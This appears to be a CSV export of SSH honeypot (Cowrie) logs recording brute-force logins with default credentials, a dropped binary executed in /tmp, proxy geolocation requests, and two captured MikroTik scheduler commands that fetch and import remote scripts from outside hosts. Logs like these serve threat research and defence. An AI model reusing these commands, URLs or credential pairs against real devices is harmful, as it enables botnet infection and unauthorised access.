eventid,timestamp,src_ip,dst_ip,session,duration,message
cowrie.session.params,2021-02-12 14:03:44.850766+00:00,110.93.246.222,,63bdd31ecaa7,,[]
cowrie.command.input,2021-02-12 14:03:44.851601+00:00,110.93.246.222,,63bdd31ecaa7,,CMD: scp -t /tmp/TmqWwR7A
cowrie.session.file_download,2021-02-12 14:03:45.095001+00:00,110.93.246.222,,a7c28d8bfed3,,Saved stdin contents with SHA-256 b9e7dfa7beb9426641411babd040262282629fa3af2ac99182317fb7eea80e6a to var/lib/cowrie/downloads/b9e7dfa7beb9426641411babd040262282629fa3af2ac99182317fb7eea80e6a
cowrie.log.closed,2021-02-12 14:03:45.096091+00:00,110.93.246.222,,a7c28d8bfed3,0.386675357818603,Closing TTY Log: var/lib/cowrie/tty/88aad3d2016d99413f4508d6ddc47379c4a24d6041eba0828632905a19d9b816 after 0 seconds
cowrie.session.file_download,2021-02-12 14:03:45.243164+00:00,110.93.246.222,,63bdd31ecaa7,,Saved stdin contents with SHA-256 b9e7dfa7beb9426641411babd040262282629fa3af2ac99182317fb7eea80e6a to var/lib/cowrie/downloads/b9e7dfa7beb9426641411babd040262282629fa3af2ac99182317fb7eea80e6a
cowrie.log.closed,2021-02-12 14:03:45.244231+00:00,110.93.246.222,,63bdd31ecaa7,0.39363002777099604,Closing TTY Log: var/lib/cowrie/tty/88aad3d2016d99413f4508d6ddc47379c4a24d6041eba0828632905a19d9b816 after 0 seconds
cowrie.session.closed,2021-02-12 14:03:45.478978+00:00,110.93.246.222,,a7c28d8bfed3,4.271041393280029,Connection lost after 4 seconds
cowrie.session.closed,2021-02-12 14:03:45.634288+00:00,110.93.246.222,,63bdd31ecaa7,4.45339298248291,Connection lost after 4 seconds
cowrie.session.connect,2021-02-12 14:03:45.889053+00:00,110.93.246.222,155.232.195.83,10838c34c2de,,New connection: 110.93.246.222:35696 (155.232.195.83:2222) [session: 10838c34c2de]
cowrie.session.connect,2021-02-12 14:03:46.037510+00:00,110.93.246.222,155.232.195.83,8ea0d5ae82df,,New connection: 110.93.246.222:35698 (155.232.195.83:2222) [session: 8ea0d5ae82df]
cowrie.client.version,2021-02-12 14:03:46.265885+00:00,110.93.246.222,,10838c34c2de,,Remote SSH version: b'SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2'
cowrie.client.version,2021-02-12 14:03:46.417859+00:00,110.93.246.222,,8ea0d5ae82df,,Remote SSH version: b'SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u2'
cowrie.client.kex,2021-02-12 14:03:46.639560+00:00,110.93.246.222,,10838c34c2de,,SSH client hassh fingerprint: ec7378c1a92f5a8dde7e8b7a1ddf33d1
cowrie.client.kex,2021-02-12 14:03:46.790012+00:00,110.93.246.222,,8ea0d5ae82df,,SSH client hassh fingerprint: ec7378c1a92f5a8dde7e8b7a1ddf33d1
cowrie.login.success,2021-02-12 14:03:48.546428+00:00,110.93.246.222,,10838c34c2de,,login attempt [pi/raspberryraspberry993311] succeeded
cowrie.login.success,2021-02-12 14:03:48.668838+00:00,110.93.246.222,,8ea0d5ae82df,,login attempt [pi/raspberry] succeeded
cowrie.client.var,2021-02-12 14:03:49.297103+00:00,110.93.246.222,,10838c34c2de,,request_env: LANG=en_GB.UTF-8
cowrie.session.params,2021-02-12 14:03:49.432937+00:00,110.93.246.222,,10838c34c2de,,[]
cowrie.command.input,2021-02-12 14:03:49.433786+00:00,110.93.246.222,,10838c34c2de,,CMD: cd /tmp && chmod +x TmqWwR7A && bash -c ./TmqWwR7A
cowrie.command.input,2021-02-12 14:03:49.435241+00:00,110.93.246.222,,10838c34c2de,,CMD: ./TmqWwR7A
cowrie.command.failed,2021-02-12 14:03:49.436018+00:00,110.93.246.222,,10838c34c2de,,Command not found: ./TmqWwR7A
cowrie.log.closed,2021-02-12 14:03:49.437758+00:00,110.93.246.222,,10838c34c2de,0.004982233047485,Closing TTY Log: var/lib/cowrie/tty/21f78aaf0e2f2e5ae443a4656ffac91df723ab5c768e69e5606a554b7345e5a2 after 0 seconds
cowrie.client.var,2021-02-12 14:03:49.438950+00:00,110.93.246.222,,8ea0d5ae82df,,request_env: LANG=en_GB.UTF-8
cowrie.session.params,2021-02-12 14:03:49.467883+00:00,110.93.246.222,,8ea0d5ae82df,,[]
cowrie.command.input,2021-02-12 14:03:49.468755+00:00,110.93.246.222,,8ea0d5ae82df,,CMD: cd /tmp && chmod +x TmqWwR7A && bash -c ./TmqWwR7A
cowrie.command.input,2021-02-12 14:03:49.470187+00:00,110.93.246.222,,8ea0d5ae82df,,CMD: ./TmqWwR7A
cowrie.command.failed,2021-02-12 14:03:49.470942+00:00,110.93.246.222,,8ea0d5ae82df,,Command not found: ./TmqWwR7A
cowrie.log.closed,2021-02-12 14:03:49.472632+00:00,110.93.246.222,,8ea0d5ae82df,0.004937171936035,Closing TTY Log: var/lib/cowrie/tty/21f78aaf0e2f2e5ae443a4656ffac91df723ab5c768e69e5606a554b7345e5a2 after 0 seconds
cowrie.session.closed,2021-02-12 14:03:49.815741+00:00,110.93.246.222,,10838c34c2de,3.925646543502807,Connection lost after 3 seconds
cowrie.session.closed,2021-02-12 14:03:49.846224+00:00,110.93.246.222,,8ea0d5ae82df,3.807698965072632,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 14:18:30.304249+00:00,178.48.207.55,155.232.195.82,f913c39d07dd,,New connection: 178.48.207.55:57506 (155.232.195.82:2222) [session: f913c39d07dd]
cowrie.session.closed,2021-02-12 14:18:30.306248+00:00,178.48.207.55,,f913c39d07dd,0.000402927398681,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 14:18:30.308230+00:00,178.48.207.55,155.232.195.83,0712200207c8,,New connection: 178.48.207.55:57507 (155.232.195.83:2222) [session: 0712200207c8]
cowrie.session.closed,2021-02-12 14:18:30.309947+00:00,178.48.207.55,,0712200207c8,0.00028920173645000005,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 14:18:34.015227+00:00,178.48.207.55,155.232.195.83,5bf2a19bc56e,,New connection: 178.48.207.55:57864 (155.232.195.83:2222) [session: 5bf2a19bc56e]
cowrie.client.version,2021-02-12 14:18:34.018681+00:00,178.48.207.55,,5bf2a19bc56e,,Remote SSH version: b'SSH-2.0-Go'
cowrie.session.connect,2021-02-12 14:18:34.033597+00:00,178.48.207.55,155.232.195.82,7f0292382971,,New connection: 178.48.207.55:57865 (155.232.195.82:2222) [session: 7f0292382971]
cowrie.client.version,2021-02-12 14:18:34.037805+00:00,178.48.207.55,,7f0292382971,,Remote SSH version: b'SSH-2.0-Go'
cowrie.client.kex,2021-02-12 14:18:34.258265+00:00,178.48.207.55,,5bf2a19bc56e,,SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6
cowrie.client.kex,2021-02-12 14:18:34.260595+00:00,178.48.207.55,,7f0292382971,,SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6
cowrie.login.success,2021-02-12 14:18:35.142549+00:00,178.48.207.55,,5bf2a19bc56e,,login attempt [admin/] succeeded
cowrie.login.success,2021-02-12 14:18:35.147542+00:00,178.48.207.55,,7f0292382971,,login attempt [admin/] succeeded
cowrie.session.params,2021-02-12 14:18:35.692809+00:00,178.48.207.55,,5bf2a19bc56e,,[]
cowrie.command.input,2021-02-12 14:18:35.693668+00:00,178.48.207.55,,5bf2a19bc56e,,"CMD: /system scheduler add name=""U6"" interval=10m on-event=""/tool fetch url=http://strtbiz.site/poll/3fd13d3d-5e25-4ae2-80bd-e37119806502 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc"" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write"
cowrie.command.failed,2021-02-12 14:18:35.694780+00:00,178.48.207.55,,5bf2a19bc56e,,"Command not found: /system scheduler add name=U6 interval=10m on-event=/tool fetch url=http://strtbiz.site/poll/3fd13d3d-5e25-4ae2-80bd-e37119806502 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write"
cowrie.session.params,2021-02-12 14:18:35.724228+00:00,178.48.207.55,,7f0292382971,,[]
cowrie.command.input,2021-02-12 14:18:35.725172+00:00,178.48.207.55,,7f0292382971,,"CMD: /system scheduler add name=""U6"" interval=10m on-event=""/tool fetch url=http://myfrance.xyz/poll/8fc51f53-7da1-45a5-9bf7-2bb9dd9ffbd9 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc"" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write"
cowrie.command.failed,2021-02-12 14:18:35.726292+00:00,178.48.207.55,,7f0292382971,,"Command not found: /system scheduler add name=U6 interval=10m on-event=/tool fetch url=http://myfrance.xyz/poll/8fc51f53-7da1-45a5-9bf7-2bb9dd9ffbd9 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write"
cowrie.log.closed,2021-02-12 14:18:35.910894+00:00,178.48.207.55,,5bf2a19bc56e,0.21826052665710402,Closing TTY Log: var/lib/cowrie/tty/c77b62aac26442a2adc4e752573960978e9a4b36e458eb411f38b27a5920a1af after 0 seconds
cowrie.log.closed,2021-02-12 14:18:35.942691+00:00,178.48.207.55,,7f0292382971,0.21865034103393502,Closing TTY Log: var/lib/cowrie/tty/2ba1cdad79a2742b42723d84f04f1cb1ce2dc5066661a63b5245810466178517 after 0 seconds
cowrie.session.closed,2021-02-12 14:18:36.141759+00:00,178.48.207.55,,5bf2a19bc56e,2.12541913986206,Connection lost after 2 seconds
cowrie.session.closed,2021-02-12 14:18:36.163672+00:00,178.48.207.55,,7f0292382971,2.128963232040405,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:17:13.609437+00:00,171.240.202.57,155.232.195.82,855c33a884db,,New connection: 171.240.202.57:43542 (155.232.195.82:2222) [session: 855c33a884db]
cowrie.client.version,2021-02-12 16:17:13.611160+00:00,171.240.202.57,,855c33a884db,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:17:13.990150+00:00,171.240.202.57,,855c33a884db,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:17:15.170212+00:00,171.240.202.57,,855c33a884db,,login attempt [ubnt/ubnt] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:17:15.560429+00:00,171.240.202.57,208.95.112.1,855c33a884db,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:17:15.989634+00:00,171.240.202.57,208.95.112.1,855c33a884db,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:17:16.369662+00:00,171.240.202.57,,855c33a884db,2.758644819259643,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:17:23.881985+00:00,116.98.170.70,155.232.195.82,ccdecccb1271,,New connection: 116.98.170.70:59316 (155.232.195.82:2222) [session: ccdecccb1271]
cowrie.client.version,2021-02-12 16:17:23.883629+00:00,116.98.170.70,,ccdecccb1271,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:17:24.307652+00:00,116.98.170.70,,ccdecccb1271,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:17:25.685164+00:00,116.98.170.70,,ccdecccb1271,,login attempt [system/OkwKcECs8qJP2Z] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:17:26.080309+00:00,116.98.170.70,208.95.112.1,ccdecccb1271,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:17:26.474842+00:00,116.98.170.70,208.95.112.1,ccdecccb1271,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:17:26.893458+00:00,116.98.170.70,,ccdecccb1271,3.009935855865478,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 16:17:33.087549+00:00,171.240.202.57,155.232.195.82,aeb6ba3ff587,,New connection: 171.240.202.57:51016 (155.232.195.82:2222) [session: aeb6ba3ff587]
cowrie.client.version,2021-02-12 16:17:33.174731+00:00,171.240.202.57,,aeb6ba3ff587,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:17:33.537684+00:00,171.240.202.57,,aeb6ba3ff587,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:17:35.081491+00:00,171.240.202.57,,aeb6ba3ff587,,login attempt [support/support] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:17:35.495729+00:00,171.240.202.57,208.95.112.1,aeb6ba3ff587,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:17:35.887731+00:00,171.240.202.57,208.95.112.1,aeb6ba3ff587,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:17:36.297594+00:00,171.240.202.57,,aeb6ba3ff587,3.208508491516113,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 16:17:48.529906+00:00,116.98.170.70,155.232.195.82,2fe20a7b3193,,New connection: 116.98.170.70:57326 (155.232.195.82:2222) [session: 2fe20a7b3193]
cowrie.client.version,2021-02-12 16:17:48.536266+00:00,116.98.170.70,,2fe20a7b3193,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:17:48.942456+00:00,116.98.170.70,,2fe20a7b3193,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:17:50.165321+00:00,116.98.170.70,,2fe20a7b3193,,login attempt [user/1234] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:17:50.572108+00:00,116.98.170.70,208.95.112.1,2fe20a7b3193,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:17:50.962871+00:00,116.98.170.70,208.95.112.1,2fe20a7b3193,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:17:51.364177+00:00,116.98.170.70,,2fe20a7b3193,2.828033447265625,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:17:54.637424+00:00,171.240.202.57,155.232.195.82,1c26cdd135f5,,New connection: 171.240.202.57:59388 (155.232.195.82:2222) [session: 1c26cdd135f5]
cowrie.client.version,2021-02-12 16:17:54.679299+00:00,171.240.202.57,,1c26cdd135f5,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:17:55.039500+00:00,171.240.202.57,,1c26cdd135f5,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:17:56.770167+00:00,171.240.202.57,,1c26cdd135f5,,login attempt [admin/0l0ctyQh243O63uD] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:17:57.151134+00:00,171.240.202.57,208.95.112.1,1c26cdd135f5,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:17:57.528794+00:00,171.240.202.57,208.95.112.1,1c26cdd135f5,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:17:57.907452+00:00,171.240.202.57,,1c26cdd135f5,3.268479824066162,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 16:18:00.982539+00:00,171.240.202.57,155.232.195.82,3b5faf7ca6dc,,New connection: 171.240.202.57:41552 (155.232.195.82:2222) [session: 3b5faf7ca6dc]
cowrie.client.version,2021-02-12 16:18:00.984218+00:00,171.240.202.57,,3b5faf7ca6dc,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:18:01.364303+00:00,171.240.202.57,,3b5faf7ca6dc,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:18:02.688071+00:00,171.240.202.57,,3b5faf7ca6dc,,login attempt [admin/123456789] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:18:03.090926+00:00,171.240.202.57,208.95.112.1,3b5faf7ca6dc,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:18:03.824981+00:00,171.240.202.57,208.95.112.1,3b5faf7ca6dc,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:18:04.295360+00:00,171.240.202.57,,3b5faf7ca6dc,3.311253070831299,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 16:18:13.601238+00:00,209.141.43.49,155.232.195.83,95cbd2cde23d,,New connection: 209.141.43.49:37938 (155.232.195.83:2222) [session: 95cbd2cde23d]
cowrie.session.closed,2021-02-12 16:18:13.922409+00:00,209.141.43.49,,95cbd2cde23d,0.31964635848999,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 16:18:38.174103+00:00,116.98.170.70,155.232.195.82,51f61593ed50,,New connection: 116.98.170.70:59104 (155.232.195.82:2222) [session: 51f61593ed50]
cowrie.client.version,2021-02-12 16:18:38.293286+00:00,116.98.170.70,,51f61593ed50,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:18:38.694985+00:00,116.98.170.70,,51f61593ed50,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:18:40.217915+00:00,116.98.170.70,,51f61593ed50,,login attempt [user/user] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:18:40.619594+00:00,116.98.170.70,208.95.112.1,51f61593ed50,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:18:41.124601+00:00,116.98.170.70,208.95.112.1,51f61593ed50,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.connect,2021-02-12 16:18:41.461914+00:00,171.240.202.57,155.232.195.82,2cab131cb336,,New connection: 171.240.202.57:47776 (155.232.195.82:2222) [session: 2cab131cb336]
cowrie.client.version,2021-02-12 16:18:41.463072+00:00,171.240.202.57,,2cab131cb336,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.session.closed,2021-02-12 16:18:41.726938+00:00,116.98.170.70,,51f61593ed50,3.5517396926879883,Connection lost after 3 seconds
cowrie.client.kex,2021-02-12 16:18:41.853535+00:00,171.240.202.57,,2cab131cb336,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:18:43.033527+00:00,171.240.202.57,,2cab131cb336,,login attempt [admin/admin] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:18:43.440396+00:00,171.240.202.57,208.95.112.1,2cab131cb336,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:18:43.830262+00:00,171.240.202.57,208.95.112.1,2cab131cb336,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:18:44.328095+00:00,171.240.202.57,,2cab131cb336,2.865129947662353,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:19:44.945371+00:00,206.189.111.9,155.232.195.83,0c1013f46494,,New connection: 206.189.111.9:55396 (155.232.195.83:2222) [session: 0c1013f46494]
cowrie.session.connect,2021-02-12 16:19:44.959631+00:00,206.189.111.9,155.232.195.82,2c4a332ecaa8,,New connection: 206.189.111.9:37022 (155.232.195.82:2222) [session: 2c4a332ecaa8]
cowrie.session.closed,2021-02-12 16:19:45.130177+00:00,206.189.111.9,,0c1013f46494,0.18191766738891602,Connection lost after 0 seconds
cowrie.session.closed,2021-02-12 16:19:45.143775+00:00,206.189.111.9,,2c4a332ecaa8,0.183116436004638,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 16:25:54.253922+00:00,171.240.202.57,155.232.195.83,6d6f32200905,,New connection: 171.240.202.57:53164 (155.232.195.83:2222) [session: 6d6f32200905]
cowrie.client.version,2021-02-12 16:25:54.255620+00:00,171.240.202.57,,6d6f32200905,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:25:54.639027+00:00,171.240.202.57,,6d6f32200905,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:25:55.817940+00:00,171.240.202.57,,6d6f32200905,,login attempt [admin/admin] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:25:56.226246+00:00,171.240.202.57,208.95.112.1,6d6f32200905,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:25:56.613114+00:00,171.240.202.57,208.95.112.1,6d6f32200905,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:25:57.054672+00:00,171.240.202.57,,6d6f32200905,2.799158811569214,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 16:26:11.329386+00:00,116.98.170.70,155.232.195.83,c6b6924522db,,New connection: 116.98.170.70:38416 (155.232.195.83:2222) [session: c6b6924522db]
cowrie.client.version,2021-02-12 16:26:11.342122+00:00,116.98.170.70,,c6b6924522db,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:26:11.797284+00:00,116.98.170.70,,c6b6924522db,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:26:13.958013+00:00,116.98.170.70,,c6b6924522db,,login attempt [user/user] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:26:14.369466+00:00,116.98.170.70,208.95.112.1,c6b6924522db,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.session.connect,2021-02-12 16:26:14.644474+00:00,116.98.170.70,155.232.195.83,d0777a2d8ade,,New connection: 116.98.170.70:56428 (155.232.195.83:2222) [session: d0777a2d8ade]
cowrie.client.version,2021-02-12 16:26:14.646098+00:00,116.98.170.70,,d0777a2d8ade,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.direct-tcpip.data,2021-02-12 16:26:14.758989+00:00,116.98.170.70,208.95.112.1,c6b6924522db,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.client.kex,2021-02-12 16:26:15.029714+00:00,116.98.170.70,,d0777a2d8ade,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.session.closed,2021-02-12 16:26:15.149613+00:00,116.98.170.70,,c6b6924522db,3.818703174591064,Connection lost after 3 seconds
cowrie.login.success,2021-02-12 16:26:16.272532+00:00,116.98.170.70,,d0777a2d8ade,,login attempt [system/OkwKcECs8qJP2Z] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:26:16.871414+00:00,116.98.170.70,208.95.112.1,d0777a2d8ade,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:26:17.255817+00:00,116.98.170.70,208.95.112.1,d0777a2d8ade,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:26:17.846346+00:00,116.98.170.70,,d0777a2d8ade,3.200356245040893,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 16:26:49.865218+00:00,171.240.202.57,155.232.195.83,5466738c8ecf,,New connection: 171.240.202.57:44874 (155.232.195.83:2222) [session: 5466738c8ecf]
cowrie.client.version,2021-02-12 16:26:49.877433+00:00,171.240.202.57,,5466738c8ecf,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:26:50.274452+00:00,171.240.202.57,,5466738c8ecf,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.session.connect,2021-02-12 16:26:51.224658+00:00,171.240.202.57,155.232.195.83,eb5ab357360b,,New connection: 171.240.202.57:52356 (155.232.195.83:2222) [session: eb5ab357360b]
cowrie.client.version,2021-02-12 16:26:51.242025+00:00,171.240.202.57,,eb5ab357360b,,Remote SSH version: b'SSH-2.0-AsyncSSH_2.1.0'
cowrie.client.kex,2021-02-12 16:26:51.671264+00:00,171.240.202.57,,eb5ab357360b,,SSH client hassh fingerprint: fda360b1b4f4d3455cb75c6e7edb1d11
cowrie.login.success,2021-02-12 16:26:52.089350+00:00,171.240.202.57,,5466738c8ecf,,login attempt [support/support] succeeded
cowrie.direct-tcpip.request,2021-02-12 16:26:52.470200+00:00,171.240.202.57,208.95.112.1,5466738c8ecf,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:26:52.853577+00:00,171.240.202.57,208.95.112.1,5466738c8ecf,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.login.success,2021-02-12 16:26:53.251948+00:00,171.240.202.57,,eb5ab357360b,,login attempt [ubnt/ubnt] succeeded
cowrie.session.closed,2021-02-12 16:26:53.314211+00:00,171.240.202.57,,5466738c8ecf,3.447429895401001,Connection lost after 3 seconds
cowrie.direct-tcpip.request,2021-02-12 16:26:53.646473+00:00,171.240.202.57,208.95.112.1,eb5ab357360b,,direct-tcp connection request to 208.95.112.1:80 from :0
cowrie.direct-tcpip.data,2021-02-12 16:26:54.055081+00:00,171.240.202.57,208.95.112.1,eb5ab357360b,,"discarded direct-tcp forward request 0 to 208.95.112.1:80 with data b'GET /json?fields=countryCode,query,as HTTP/1.1\r\nHost: ip-api.com\r\nUser-Agent: curl\r\n\r\n'"
cowrie.session.closed,2021-02-12 16:26:54.430645+00:00,171.240.202.57,,eb5ab357360b,3.204465389251709,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 16:27:07.058147+00:00,171.240.202.57,155.232.195.83,6dbf696052b3,,New connection: 171.240.202.57:58154 (155.232.195.83:2222) [session: 6dbf696052b3]
